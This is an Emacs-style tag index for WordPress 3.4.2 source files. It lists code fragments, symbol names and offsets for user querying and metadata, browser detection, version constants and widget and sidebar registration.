		$option_name = $wpdb->prefix . $option_name;option_name297,8904
function delete_user_option( $user_id, $option_name, $global = false ) {delete_user_option322,9880
function delete_user_option( $user_id, $option_name, $global = false ) {global322,9880
		$option_name = $wpdb->prefix . $option_name;option_name326,9986
class WP_User_Query {WP_User_Query335,10146
	var $results;results344,10262
	var $total_users = 0;total_users353,10396
	var $total_users = 0;total_users353,10396
	var $query_fields;query_fields356,10436
	var $query_from;query_from357,10456
	var $query_where;query_where358,10474
	var $query_orderby;query_orderby359,10493
	var $query_limit;query_limit360,10514
	function __construct( $query = null ) {__construct370,10666
	function __construct( $query = null ) {query370,10666
			$this->query_vars = wp_parse_args( $query, array(query_vars372,10735
	function prepare_query() {prepare_query402,11321
		$qv = &$this->query_vars;qv405,11366
			$this->query_fields = array();query_fields410,11483
			$this->query_fields = implode( ',', $this->query_fields );query_fields413,11624
			$this->query_fields = "$wpdb->users.*";query_fields415,11726
			$this->query_fields = "$wpdb->users.ID";query_fields417,11780
			$this->query_fields = 'SQL_CALC_FOUND_ROWS ' . $this->query_fields;query_fields421,11871
		$this->query_from = "FROM $wpdb->users";query_from423,11943
		$this->query_where = "WHERE 1=1";query_where424,11986
			$orderby = 'user_' . $qv['orderby'];orderby428,12123
			$orderby = $qv['orderby'];orderby430,12276
			$orderby = 'display_name';orderby432,12384
			$where = get_posts_by_author_sql('post');where435,12489
			$orderby = 'post_count';orderby443,12735
			$orderby = 'ID';orderby445,12829
			$orderby = 'user_login';orderby447,12860
			$order = 'ASC';order452,12969
			$order = 'DESC';order454,12995
		$this->query_orderby = "ORDER BY $orderby $order";query_orderby455,13015
				$this->query_limit = $wpdb->prepare("LIMIT %d, %d", $qv['offset'], $qv['number']);query_limit460,13129
				$this->query_limit = $wpdb->prepare("LIMIT %d", $qv['number']);query_limit462,13224
		$search = trim( $qv['search'] );search465,13297
			$leading_wild = ( ltrim($search, '*') != $search );leading_wild467,13351
			$trailing_wild = ( rtrim($search, '*') != $search );trailing_wild468,13406
				$wild = 'both';wild470,13504
				$wild = 'leading';wild472,13552
				$wild = 'trailing';wild474,13604
				$wild = false;wild476,13636
				$search = trim($search, '*');search478,13671
			$search_columns = array();search_columns480,13706
				$search_columns = array_intersect( $qv['search_columns'], array( 'ID', 'user_login', 'user_email', 'user_url', 'user_nicename' ) );search_columns482,13768
					$search_columns = array('user_email');search_columns485,13977
					$search_columns = array('user_login', 'ID');search_columns487,14056
					$search_columns = array('user_url');search_columns489,14193
					$search_columns = array('user_login', 'user_nicename');search_columns491,14244
		$blog_id = absint( $qv['blog_id'] );blog_id497,14399
			$qv['blog_id'] = $blog_id = 0; // Prevent extra meta queryblog_id503,14615
		$role = trim( $qv['role'] );role506,14682
			$cap_meta_query = array();cap_meta_query509,14765
		$meta_query = new WP_Meta_Query();meta_query520,15039
			$clauses = $meta_query->get_sql( 'user', $wpdb->users, 'ID', $this );clauses524,15159
				$this->query_fields = 'DISTINCT ' . $this->query_fields;query_fields529,15359
			$ids = implode( ',', wp_parse_id_list( $qv['include'] ) );ids533,15461
			$ids = implode( ',', wp_parse_id_list( $qv['exclude'] ) );ids536,15622
	function query() {query549,15917
			$this->results = $wpdb->get_results("SELECT $this->query_fields $this->query_from $this->query_where $this->query_orderby $this->query_limit");results553,16045
			$this->results = $wpdb->get_col("SELECT $this->query_fields $this->query_from $this->query_where $this->query_orderby $this->query_limit");results555,16203
			$this->total_users = $wpdb->get_var( apply_filters( 'found_users_query', 'SELECT FOUND_ROWS()' ) );total_users559,16393
			$r = array();r567,16627
			$this->results = $r;results571,16764
	function get_search_sql( $string, $cols, $wild = false ) {get_search_sql587,17205
	function get_search_sql( $string, $cols, $wild = false ) {wild587,17205
		$string = esc_sql( $string );string588,17265
		$searches = array();searches590,17298
		$leading_wild = ( 'leading' == $wild || 'both' == $wild ) ? '%' : '';leading_wild591,17321
		$trailing_wild = ( 'trailing' == $wild || 'both' == $wild ) ? '%' : '';trailing_wild592,17393
	function get_results() {get_results611,17819
	function get_total() {get_total623,18005
function get_users( $args = array() ) {get_users638,18284
function get_users( $args = array() ) {args638,18284
	$args = wp_parse_args( $args );args640,18325
	$user_search = new WP_User_Query($args);user_search643,18390
function get_blogs_of_user( $user_id, $all = false ) {get_blogs_of_user657,18804
function get_blogs_of_user( $user_id, $all = false ) {all657,18804
	$user_id = (int) $user_id;user_id660,18875
	$keys = get_user_meta( $user_id );keys666,18987
		$blog_id = get_current_blog_id();blog_id671,19092
		$blogs = array( $blog_id => new stdClass );blogs672,19128
	$blogs = array();blogs682,19456
		$blog = get_blog_details( 1 );blog685,19566
	$keys = array_keys( $keys );keys699,20026
		$blog_id = str_replace( array( $wpdb->base_prefix, '_capabilities' ), '', $key );blog_id706,20232
		$blog_id = (int) $blog_id;blog_id710,20364
		$blog = get_blog_details( $blog_id );blog711,20393
function is_user_member_of_blog( $user_id = 0, $blog_id = 0 ) {is_user_member_of_blog737,21200
function is_user_member_of_blog( $user_id = 0, $blog_id = 0 ) {user_id737,21200
	$user_id = (int) $user_id;user_id738,21264
	$blog_id = (int) $blog_id;blog_id739,21292
		$user_id = get_current_user_id();user_id742,21347
		$blog_id = get_current_blog_id();blog_id745,21410
	$blogs = get_blogs_of_user( $user_id );blogs747,21447
function add_user_meta($user_id, $meta_key, $meta_value, $unique = false) {add_user_meta766,22036
function add_user_meta($user_id, $meta_key, $meta_value, $unique = false) {unique766,22036
function delete_user_meta($user_id, $meta_key, $meta_value = '') {delete_user_meta786,22766
function delete_user_meta($user_id, $meta_key, $meta_value = '') {meta_value786,22766
function get_user_meta($user_id, $key = '', $single = false) {get_user_meta803,23364
function get_user_meta($user_id, $key = '', $single = false) {key803,23364
function update_user_meta($user_id, $meta_key, $meta_value, $prev_value = '') {update_user_meta825,24081
function update_user_meta($user_id, $meta_key, $meta_value, $prev_value = '') {prev_value825,24081
 * Using $strategy = 'time' this is CPU-intensive and should handle around 10^7 users.strategy834,24485
 * Using $strategy = 'memory' this is memory-intensive and should handle around 10^5 users, but see WP Bug #12257.strategy835,24572
function count_users($strategy = 'time') {count_users841,24844
	$id = get_current_blog_id();id845,24929
	$blog_prefix = $wpdb->get_blog_prefix($id);blog_prefix846,24959
	$result = array();result847,25004
			$wp_roles = new WP_Roles();wp_roles853,25106
		$avail_roles = $wp_roles->get_names();avail_roles855,25138
		$select_count = array();select_count858,25251
		foreach ( $avail_roles as $this_role => $name ) {this_role859,25278
		$select_count = implode(', ', $select_count);select_count862,25440
		$row = $wpdb->get_row( "SELECT $select_count, COUNT(*) FROM $wpdb->usermeta WHERE meta_key = '{$blog_prefix}capabilities'", ARRAY_N );row865,25562
		$col = 0;col868,25771
		$role_counts = array();role_counts869,25783
		foreach ( $avail_roles as $this_role => $name ) {this_role870,25809
			$count = (int) $row[$col++];count871,25861
		$total_users = (int) $row[$col];total_users878,26025
		$avail_roles = array();avail_roles883,26154
		$users_of_blog = $wpdb->get_col( "SELECT meta_value FROM $wpdb->usermeta WHERE meta_key = '{$blog_prefix}capabilities'" );users_of_blog885,26181
			$b_roles = maybe_unserialize($caps_meta);b_roles888,26352
			foreach ( $b_roles as $b_role => $val ) {b_role891,26444
function setup_userdata($for_user_id = '') {setup_userdata928,27430
		$user = wp_get_current_user();user932,27614
		$user = new WP_User($for_user_id);user934,27653
	$userdata   = null;userdata936,27691
	$user_ID    = (int) $user->ID;user_ID937,27712
	$user_level = (int) isset($user->user_level) ? $user->user_level : 0;user_level938,27744
		$user_login = $user_email = $user_url = $user_pass_md5 = $user_identity = '';user_login941,27844
	$userdata   = $user;userdata945,27938
	$user_login = $user->user_login;user_login946,27960
	$user_email = $user->user_email;user_email947,27994
	$user_url   = $user->user_url;user_url948,28028
	$user_pass_md5 = md5( $user->user_pass );user_pass_md5949,28060
	$user_identity = $user->display_name;user_identity950,28103
function wp_dropdown_users( $args = '' ) {wp_dropdown_users988,30200
function wp_dropdown_users( $args = '' ) {args988,30200
	$defaults = array(defaults989,30243
	$r = wp_parse_args( $args, $defaults );r1000,30706
	$query_args = wp_array_slice_assoc( $r, array( 'blog_id', 'include', 'exclude', 'orderby', 'order', 'who' ) );query_args1003,30775
	$users = get_users( $query_args );users1005,30934
	$output = '';output1007,30971
		$name = esc_attr( $name );name1009,31071
			$id = '';id1011,31125
			$id = $id ? " id='" . esc_attr( $id ) . "'" : " id='$name'";id1013,31145
		$output = "<select name='{$name}'{$id} class='$class'>\n";output1015,31210
			$_selected = selected( -1, $selected, false );_selected1021,31393
		$found_selected = false;found_selected1025,31525
			$_selected = selected( $user->ID, $selected, false );_selected1028,31624
				$found_selected = true;found_selected1030,31702
			$display = !empty($user->$show) ? $user->$show : '('. $user->user_login . ')';display1031,31730
			$user = get_userdata( $selected );user1036,31981
			$_selected = selected( $user->ID, $selected, false );_selected1037,32019
			$display = !empty($user->$show) ? $user->$show : '('. $user->user_login . ')';display1038,32076
	$output = apply_filters('wp_dropdown_users', $output);output1045,32286
 * @uses apply_filters() Calls 'edit_$field' passing $value and $user_id if $context == 'edit'.context1061,32675
 * @uses apply_filters() Calls 'pre_$field' passing $value if $context == 'db'. $field is prefixed withcontext1063,32828
 * @uses apply_filters() Calls '$field' passing $value, $user_id and $context if $context == anythingcontext1065,32965
function sanitize_user_field($field, $value, $user_id, $context) {sanitize_user_field1075,33466
	$int_fields = array('ID');int_fields1076,33533
		$value = (int) $value;value1078,33599
	$prefixed = false !== strpos( $field, 'user_' );prefixed1086,33737
			$value = apply_filters("edit_{$field}", $value, $user_id);value1090,33838
			$value = apply_filters("edit_user_{$field}", $value, $user_id);value1092,33911
			$value = esc_html( $value ); // textarea_escaped?value1096,34016
			$value = esc_attr($value);value1098,34076
			$value = apply_filters("pre_{$field}", $value);value1101,34161
			$value = apply_filters("pre_user_{$field}", $value);value1103,34223
			$value = apply_filters($field, $value, $user_id, $context);value1108,34349
			$value = apply_filters("user_{$field}", $value, $user_id, $context);value1110,34419
		$value = esc_url($value);value1114,34524
		$value = esc_attr($value);value1117,34585
		$value = esc_js($value);value1119,34644
function update_user_caches($user) {update_user_caches1131,34795
function clean_user_cache( $user ) {clean_user_cache1145,35185
		$user = new WP_User( $user );user1147,35250
function username_exists( $username ) {username_exists1166,35702
	if ( $user = get_user_by('login', $username ) ) {user1167,35742
function email_exists( $email ) {email_exists1183,36030
	if ( $user = get_user_by('email', $email) )user1184,36064
function validate_username( $username ) {validate_username1199,36403
	$sanitized = sanitize_user( $username, true );sanitized1200,36445
	$valid = ( $sanitized == $username );valid1201,36493
function wp_insert_user($userdata) {wp_insert_user1251,39018
		$ID = (int) $ID;ID1258,39159
		$update = true;update1259,39178
		$old_user_data = WP_User::get_data_by( 'id', $ID );old_user_data1260,39196
		$update = false;update1262,39260
		$user_pass = wp_hash_password($user_pass);user_pass1264,39302
	$user_login = sanitize_user($user_login, true);user_login1267,39351
	$user_login = apply_filters('pre_user_login', $user_login);user_login1268,39400
	$user_login = trim($user_login);user_login1271,39568
		$user_nicename = sanitize_title( $user_login );user_nicename1280,39902
	$user_nicename = apply_filters('pre_user_nicename', $user_nicename);user_nicename1281,39952
		$user_url = '';user_url1284,40048
	$user_url = apply_filters('pre_user_url', $user_url);user_url1285,40066
		$user_email = '';user_email1288,40149
	$user_email = apply_filters('pre_user_email', $user_email);user_email1289,40169
		$display_name = $user_login;display_name1295,40434
	$display_name = apply_filters('pre_user_display_name', $display_name);display_name1296,40465
		$nickname = $user_login;nickname1299,40563
	$nickname = apply_filters('pre_user_nickname', $nickname);nickname1300,40590
		$first_name = '';first_name1303,40678
	$first_name = apply_filters('pre_user_first_name', $first_name);first_name1304,40698
		$last_name = '';last_name1307,40791
	$last_name = apply_filters('pre_user_last_name', $last_name);last_name1308,40810
		$description = '';description1311,40902
	$description = apply_filters('pre_user_description', $description);description1312,40923
		$rich_editing = 'true';rich_editing1315,41022
		$comment_shortcuts = 'false';comment_shortcuts1318,41083
		$admin_color = 'fresh';admin_color1321,41144
	$admin_color = preg_replace('|[^a-z0-9 _.\-@]|i', '', $admin_color);admin_color1322,41170
		$use_ssl = 0;use_ssl1325,41265
		$user_registered = gmdate('Y-m-d H:i:s');user_registered1328,41314
		$show_admin_bar_front = 'true';show_admin_bar_front1331,41396
	$user_nicename_check = $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->users WHERE user_nicename = %s AND user_login != %s LIMIT 1" , $user_nicename, $user_login));user_nicename_check1333,41431
		$suffix = 2;suffix1336,41635
			$alt_user_nicename = $user_nicename . "-$suffix";alt_user_nicename1338,41683
			$user_nicename_check = $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->users WHERE user_nicename = %s AND user_login != %s LIMIT 1" , $alt_user_nicename, $user_login));user_nicename_check1339,41736
		$user_nicename = $alt_user_nicename;user_nicename1342,41932
	$data = compact( 'user_pass', 'user_email', 'user_url', 'user_nicename', 'display_name', 'user_registered' );data1345,41975
	$data = stripslashes_deep( $data );data1346,42086
		$user_id = (int) $ID;user_id1350,42199
		$user_id = (int) $wpdb->insert_id;user_id1353,42299
	$user = new WP_User( $user_id );user1356,42340
function wp_update_user($userdata) {wp_update_user1398,43498
	$ID = (int) $userdata['ID'];ID1399,43535
	$user_obj = get_userdata( $ID );user_obj1402,43608
	$user = get_object_vars( $user_obj->data );user1404,43643
	$user = add_magic_quotes( $user );user1412,43872
		$plaintext_pass = $userdata['user_pass'];plaintext_pass1416,43993
	$userdata = array_merge($user, $userdata);userdata1423,44232
	$user_id = wp_insert_user($userdata);user_id1424,44276
	$current_user = wp_get_current_user();current_user1427,44364
function wp_create_user($username, $password, $email = '') {wp_create_user1452,45045
function wp_create_user($username, $password, $email = '') {email1452,45045
	$user_login = esc_sql( $username );user_login1453,45106
	$user_email = esc_sql( $email    );user_email1454,45143
	$user_pass = $password;user_pass1455,45180
	$userdata = compact('user_login', 'user_email', 'user_pass');userdata1457,45206
function _get_additional_user_keys( $user ) {_get_additional_user_keys1470,45485
	$keys = array( 'first_name', 'last_name', 'nickname', 'description', 'rich_editing', 'comment_shortcuts', 'admin_color', 'use_ssl', 'show_admin_bar_front' );keys1471,45531
function _wp_get_user_contactmethods( $user = null ) {_wp_get_user_contactmethods1484,45988
function _wp_get_user_contactmethods( $user = null ) {user1484,45988
	$user_contactmethods = array(user_contactmethods1485,46043

wordpress/wp-includes/vars.php,1666
	$pagenow = $self_matches[1];pagenow28,926
	$pagenow = trim($pagenow, '/');pagenow29,956
	$pagenow = preg_replace('#\?.*?$#', '', $pagenow);pagenow30,989
		$pagenow = 'index.php';pagenow32,1119
		$pagenow = strtolower($self_matches[1]);pagenow35,1210
		$pagenow = strtolower($self_matches[1]);pagenow41,1497
		$pagenow = 'index.php';pagenow43,1546
$is_lynx = $is_gecko = $is_winIE = $is_macIE = $is_opera = $is_NS4 = $is_safari = $is_chrome = $is_iphone = false;is_lynx48,1625
		$is_lynx = true;is_lynx52,1849
			if ( $is_chrome = apply_filters( 'use_google_chrome_frame', is_admin() ) )is_chrome55,2016
			$is_winIE = ! $is_chrome;is_winIE57,2137
			$is_chrome = true;is_chrome59,2177
		$is_safari = true;is_safari62,2276
		$is_gecko = true;is_gecko64,2368
		$is_winIE = true;is_winIE66,2514
		$is_macIE = true;is_macIE68,2660
		$is_opera = true;is_opera70,2751
		$is_NS4 = true;is_NS472,2903
	$is_iphone = true;is_iphone77,3005
$is_IE = ( $is_macIE || $is_winIE );is_IE79,3026
$is_apache = (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false || strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false);is_apache87,3179
$is_IIS = !$is_apache && (strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== false || strpos($_SERVER['SERVER_SOFTWARE'], 'ExpressionDevServer') !== false);is_IIS93,3402
$is_iis7 = $is_IIS && (strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS/7.') !== false);is_iis799,3641
function wp_is_mobile() {wp_is_mobile106,3854
	static $is_mobile;is_mobile107,3880
		$is_mobile = false;is_mobile113,3994
			$is_mobile = true;is_mobile120,4449
		$is_mobile = false;is_mobile122,4481

wordpress/wp-includes/version.php,319
$wp_version = '3.4.2';wp_version7,79
$wp_db_version = 21707;wp_db_version14,241
$tinymce_version = '349-21274';tinymce_version21,341
$manifest_version = '20111113';manifest_version28,457
$required_php_version = '5.2.4';required_php_version35,575
$required_mysql_version = '5.0';required_mysql_version42,698

wordpress/wp-includes/widgets.php,16727
 * This class must be extended for each widget and WP_Widget::widget(), WP_Widget::update()must17,508
class WP_Widget {WP_Widget24,715
	var $id_base;			// Root id for all widgets of this type.id_base26,734
	var $name;				// Name for this widget type.name27,792
	var $widget_options;	// Option array passed to wp_register_sidebar_widget()widget_options28,837
	var $control_options;	// Option array passed to wp_register_widget_control()control_options29,914
	var $number = false;	// Unique ID number of the current instance.number31,993
	var $number = false;	// Unique ID number of the current instance.number31,993
	var $id = false;		// Unique ID string of the current instance (id_base-number)id32,1060
	var $id = false;		// Unique ID string of the current instance (id_base-number)id32,1060
	var $updated = false;	// Set true when we update the data after a POST submit - makes sure we don't do it twice.updated33,1140
	var $updated = false;	// Set true when we update the data after a POST submit - makes sure we don't do it twice.updated33,1140
	 * Subclasses should over-ride this function to generate their widget code.to39,1336
	function widget($args, $instance) {widget44,1615
	 * This function should check that $new_instance is set correctly.should50,1770
	function update($new_instance, $old_instance) {update58,2198
	function form($instance) {form66,2363
	function WP_Widget( $id_base = false, $name, $widget_options = array(), $control_options = array() ) {WP_Widget76,2576
	function WP_Widget( $id_base = false, $name, $widget_options = array(), $control_options = array() ) {id_base76,2576
	 * if left empty a portion of the widget's class name will be used. Has to be unique.name84,2866
	function __construct( $id_base = false, $name, $widget_options = array(), $control_options = array() ) {__construct93,3379
	function __construct( $id_base = false, $name, $widget_options = array(), $control_options = array() ) {id_base93,3379
		$this->id_base = empty($id_base) ? preg_replace( '/(wp_)?widget_/', '', strtolower(get_class($this)) ) : strtolower($id_base);id_base94,3485
		$this->name = $name;name95,3614
		$this->option_name = 'widget_' . $this->id_base;option_name96,3637
		$this->widget_options = wp_parse_args( $widget_options, array('classname' => $this->option_name) );widget_options97,3688
		$this->control_options = wp_parse_args( $control_options, array('id_base' => $this->id_base) );control_options98,3790
	 * This function should be used in form() methods to create name attributes for fields to be saved by update()should104,3957
	function get_field_name($field_name) {get_field_name109,4169
	 * This function should be used in form() methods to create id attributes for fields to be saved by update()should116,4362
	function get_field_id($field_name) {get_field_id121,4570
	function _register() {_register127,4740
		$settings = $this->get_settings();settings128,4764
		$empty = true;empty129,4801
					$empty = false;empty136,4996
	function _set($number) {_set149,5195
		$this->number = $number;number150,5221
		$this->id = $this->id_base . '-' . $number;id151,5248
	function _get_display_callback() {_get_display_callback154,5298
	function _get_update_callback() {_get_update_callback158,5382
	function _get_form_callback() {_get_form_callback162,5464
	function display_callback( $args, $widget_args = 1 ) {display_callback169,5670
	function display_callback( $args, $widget_args = 1 ) {widget_args169,5670
			$widget_args = array( 'number' => $widget_args );widget_args171,5760
		$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );widget_args173,5814
		$instance = $this->get_settings();instance175,5928
			$instance = $instance[$this->number];instance178,6022
			$instance = apply_filters('widget_display_callback', $instance, $this, $args);instance180,6143
	function update_callback( $widget_args = 1 ) {update_callback188,6372
	function update_callback( $widget_args = 1 ) {widget_args188,6372
			$widget_args = array( 'number' => $widget_args );widget_args192,6488
		$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );widget_args194,6542
		$all_instances = $this->get_settings();all_instances195,6615
		$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets201,6726
				$del_id = $_POST['the-widget-id'];del_id206,6944
				$number = $wp_registered_widgets[$del_id]['params'][0]['number'];number211,7078
				if ( $this->id_base . '-' . $number == $del_id )number213,7149
				$settings = $_POST['widget-' . $this->id_base];settings218,7357
				$num = $_POST['multi_number'] ? (int) $_POST['multi_number'] : (int) $_POST['widget_number'];num220,7491
				$settings = array( $num => array() );settings221,7589
			foreach ( $settings as $number => $new_instance ) {number226,7661
				$new_instance = stripslashes_deep($new_instance);new_instance227,7716
				$old_instance = isset($all_instances[$number]) ? $all_instances[$number] : array();old_instance230,7797
				$instance = $this->update($new_instance, $old_instance);instance232,7886
				$instance = apply_filters('widget_update_callback', $instance, $new_instance, $old_instance, $this);instance235,8066
		$this->updated = true;updated244,8323
	function form_callback( $widget_args = 1 ) {form_callback249,8423
	function form_callback( $widget_args = 1 ) {widget_args249,8423
			$widget_args = array( 'number' => $widget_args );widget_args251,8503
		$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );widget_args253,8557
		$all_instances = $this->get_settings();all_instances254,8630
			$instance = array();instance259,8795
			$instance = $all_instances[ $widget_args['number'] ];instance262,8870
		$instance = apply_filters('widget_form_callback', $instance, $this);instance266,9021
		$return = null;return268,9093
			$return = $this->form($instance);return270,9142
	function _register_one($number = -1) {_register_one279,9530
	function save_settings($settings) {save_settings285,9992
	function get_settings() {get_settings290,10116
		$settings = get_option($this->option_name);settings291,10143
			$settings = get_option($this->alt_option_name);settings294,10252
			$settings = array();settings297,10334
			$settings = wp_convert_widget_settings($this->id_base, $this->option_name, $settings);settings301,10479
class WP_Widget_Factory {WP_Widget_Factory316,10790
	var $widgets = array();widgets317,10816
	var $widgets = array();widgets317,10816
	function WP_Widget_Factory() {WP_Widget_Factory319,10842
	function register($widget_class) {register323,10953
	function unregister($widget_class) {unregister327,11048
	function _register_widgets() {_register_widgets332,11177
		$keys = array_keys($this->widgets);keys334,11242
		$registered = array_keys($wp_registered_widgets);registered335,11280
		$registered = array_map('_get_widget_id_base', $registered);registered336,11332
$wp_registered_sidebars = array();wp_registered_sidebars361,11976
$wp_registered_widgets = array();wp_registered_widgets369,12113
$wp_registered_widget_controls = array();wp_registered_widget_controls377,12274
$wp_registered_widget_updates = array();wp_registered_widget_updates378,12316
$_wp_sidebars_widgets = array();_wp_sidebars_widgets383,12377
 * @param string $widget_class The name of a class that extends WP_Widgetthat426,13264
function register_widget($widget_class) {register_widget428,13342
 * Run within a function hooked to the widgets_init action.hooked438,13569
 * @param string $widget_class The name of a class that extends WP_Widgetthat446,13725
function unregister_widget($widget_class) {unregister_widget448,13803
 * This function will allow you to do so. If you don't pass the 'name' and/orwill458,14044
 *	function to handle building the sidebar.to472,14871
function register_sidebars($number = 1, $args = array()) {register_sidebars477,15055
function register_sidebars($number = 1, $args = array()) {args477,15055
	$number = (int) $number;number479,15147
	for ( $i = 1; $i <= $number; $i++ ) {i484,15227
		$_args = $args;_args485,15266
			$n = 2; // Start at -2 for conflicting custom ID'sn496,15704
			$n = count($wp_registered_sidebars);n500,15872
function register_sidebar($args = array()) {register_sidebar541,17470
	$i = count($wp_registered_sidebars) + 1;i544,17549
	$defaults = array(defaults546,17592
	$sidebar = wp_parse_args( $args, $defaults );sidebar557,17893
function unregister_sidebar( $name ) {unregister_sidebar577,18317
 * The function can also be used to unregister widgets when $output_callbackcan589,18600
function wp_register_sidebar_widget($id, $name, $output_callback, $options = array()) {wp_register_sidebar_widget604,19214
function wp_register_sidebar_widget($id, $name, $output_callback, $options = array()) {options604,19214
	$id = strtolower($id);id607,19433
	$id_base = _get_widget_id_base($id);id_base614,19544
	$defaults = array('classname' => $output_callback);defaults625,19916
	$options = wp_parse_args($options, $defaults);options626,19969
	$widget = array(widget627,20017
	$widget = array_merge($widget, $options);widget633,20153
function wp_widget_description( $id ) {wp_widget_description653,20779
function wp_sidebar_description( $id ) {wp_sidebar_description674,21365
function wp_unregister_sidebar_widget($id) {wp_unregister_sidebar_widget691,21700
function wp_register_widget_control($id, $name, $control_callback, $options = array()) {wp_register_widget_control716,22709
function wp_register_widget_control($id, $name, $control_callback, $options = array()) {options716,22709
	$id = strtolower($id);id719,22929
	$id_base = _get_widget_id_base($id);id_base720,22953
	$defaults = array('width' => 250, 'height' => 200 ); // height is never useddefaults738,23444
	$options = wp_parse_args($options, $defaults);options739,23522
	$widget = array(widget743,23665
	$widget = array_merge($widget, $options);widget749,23802
function _register_widget_update_callback($id_base, $update_callback, $options = array()) {_register_widget_update_callback763,24179
function _register_widget_update_callback($id_base, $update_callback, $options = array()) {options763,24179
	$widget = array(widget772,24466
	$widget = array_merge($widget, $options);widget777,24569
function _register_widget_form_callback($id, $name, $form_callback, $options = array()) {_register_widget_form_callback781,24667
function _register_widget_form_callback($id, $name, $form_callback, $options = array()) {options781,24667
	$id = strtolower($id);id784,24798
	$defaults = array('width' => 250, 'height' => 200 );defaults794,25010
	$options = wp_parse_args($options, $defaults);options795,25064
	$widget = array(widget799,25207
	$widget = array_merge($widget, $options);widget805,25341
function wp_unregister_widget_control($id) {wp_unregister_widget_control818,25616
 * for this function or "Pay no heed to the man behind the curtain." Just acceptor833,26259
function dynamic_sidebar($index = 1) {dynamic_sidebar841,26607
		$index = "sidebar-$index";index845,26729
		$index = sanitize_title($index);index847,26768
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {key848,26803
				$index = $key;index850,26922
	$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets856,26965
	$sidebar = $wp_registered_sidebars[$index];sidebar863,27253
	$did_one = false;did_one865,27299
		$params = array_merge(params870,27431
		// Substitute HTML id and class attributes into before_widgetattributes875,27629
		$classname_ = '';classname_876,27693
		$classname_ = ltrim($classname_, '_');classname_883,27914
		$params = apply_filters( 'dynamic_sidebar_params', $params );params886,28044
		$callback = $wp_registered_widgets[$id]['callback'];callback888,28109
			$did_one = true;did_one894,28308
 * this function has to run after widgets have initialized, at action 'init' or later.has912,28914
function is_active_widget($callback = false, $widget_id = false, $id_base = false, $skip_inactive = true) {is_active_widget922,29431
function is_active_widget($callback = false, $widget_id = false, $id_base = false, $skip_inactive = true) {widget_id922,29431
	$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets925,29572
		foreach ( $sidebars_widgets as $sidebar => $widgets ) {sidebar928,29659
						if ( !$widget_id || $widget_id == $wp_registered_widgets[$widget]['id'] )widget_id935,30065
function is_dynamic_sidebar() {is_dynamic_sidebar952,30372
	$sidebars_widgets = get_option('sidebars_widgets');sidebars_widgets954,30461
	foreach ( (array) $wp_registered_sidebars as $index => $sidebar ) {index955,30514
function is_active_sidebar( $index ) {is_active_sidebar973,30975
	$index = ( is_int($index) ) ? "sidebar-$index" : sanitize_title($index);index974,31014
	$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets975,31088
function wp_get_sidebars_widgets($deprecated = true) {wp_get_sidebars_widgets996,31580
			$_wp_sidebars_widgets = get_option('sidebars_widgets', array());_wp_sidebars_widgets1006,32008
		$sidebars_widgets = $_wp_sidebars_widgets;sidebars_widgets1008,32077
		$sidebars_widgets = get_option('sidebars_widgets', array());sidebars_widgets1010,32132
	$sidebars_widgets = apply_filters('sidebars_widgets', $sidebars_widgets);sidebars_widgets1016,32328
function wp_set_sidebars_widgets( $sidebars_widgets ) {wp_set_sidebars_widgets1028,32605
function wp_get_widget_defaults() {wp_get_widget_defaults1042,32928
	$defaults = array();defaults1045,32998
	foreach ( (array) $wp_registered_sidebars as $index => $sidebar )index1047,33021
function wp_convert_widget_settings($base_name, $option_name, $settings) {wp_convert_widget_settings1060,33256
	$single = $changed = false;single1062,33365
		$single = true;single1064,33421
				$single = true;single1070,33575
		$settings = array( 2 => $settings );settings1077,33637
			$sidebars_widgets = get_option('sidebars_widgets');sidebars_widgets1081,33787
			$sidebars_widgets = &$GLOBALS['_wp_sidebars_widgets'];sidebars_widgets1085,33983
		foreach ( (array) $sidebars_widgets as $index => $sidebar ) {index1088,34046
				foreach ( $sidebar as $i => $name ) {i1090,34141
					if ( $base_name == $name ) {base_name1091,34183
						$changed = true;changed1093,34266
 * @param string $widget the widget's PHP class name (see default-widgets.php)name1116,34610
function the_widget($widget, $instance = array(), $args = array()) {the_widget1121,34815
function the_widget($widget, $instance = array(), $args = array()) {instance1121,34815
	$widget_obj = $wp_widget_factory->widgets[$widget];widget_obj1124,34913
	$before_widget = sprintf('<div class="widget %s">', $widget_obj->widget_options['classname'] );before_widget1128,35017
	$default_args = array( 'before_widget' => $before_widget, 'after_widget' => "</div>", 'before_title' => '<h2 class="widgettitle">', 'after_title' => '</h2>' );default_args1129,35114
	$args = wp_parse_args($args, $default_args);args1131,35276
	$instance = wp_parse_args($instance);instance1132,35322
function _get_widget_id_base($id) {_get_widget_id_base1143,35504
function _wp_sidebars_changed() {_wp_sidebars_changed1153,35681
		$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets1157,35783
function retrieve_widgets($theme_changed = false) {retrieve_widgets1163,35935
	$registered_sidebar_keys = array_keys( $wp_registered_sidebars );registered_sidebar_keys1166,36095
	$orphaned = 0;orphaned1167,36162
	$old_sidebars_widgets = get_theme_mod( 'sidebars_widgets' );old_sidebars_widgets1169,36179
		$_sidebars_widgets = $old_sidebars_widgets['data'];_sidebars_widgets1172,36359
		foreach ( $_sidebars_widgets as $sidebar => $widgets ) {sidebar1175,36456
		$old = array_keys($sidebars_widgets);old1190,36913
		if ( $old == $registered_sidebar_keys )old1194,37002
		$_sidebars_widgets = array(_sidebars_widgets1197,37056
		foreach ( $wp_registered_sidebars as $id => $settings ) {id1203,37278
	$shown_widgets = array();shown_widgets1222,37886
	foreach ( $_sidebars_widgets as $sidebar => $widgets ) {sidebar1224,37914
		$_widgets = array();_widgets1228,38015
		$shown_widgets = array_merge($shown_widgets, $_widgets);shown_widgets1235,38199
	$sidebars_widgets = $_sidebars_widgets;sidebars_widgets1238,38262
	$lost_widgets = array();lost_widgets1242,38387
	foreach ( $wp_registered_widgets as $key => $val ) {key1243,38413
